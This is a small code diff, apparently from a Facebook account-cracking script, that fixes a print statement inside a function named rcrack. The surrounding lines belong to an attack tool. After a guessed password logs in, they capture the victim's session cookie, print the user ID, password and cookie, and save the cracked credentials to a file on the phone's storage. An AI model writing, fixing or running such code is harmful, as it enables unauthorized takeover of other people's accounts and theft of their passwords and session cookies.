@@ -409,7 +409,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                print('\033[1;32m(MARWAN-OK)  '+uid+' | '+ps+ '  ' \033[1;34mCookie = \033[1;34m'+coki+  ' \n '+pro+'  \033[0;94m')
+                print('\033[1;32m(MARWAN-OK)  '+uid+' | '+ps+ ' \033[1;34mCookie = \033[1;34m'+coki+  ' \n '+pro+'  \033[0;94m')
                 cek_apk(session,coki)
                 open('/sdcard/MARWAN-0X-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 oks.append(uid)
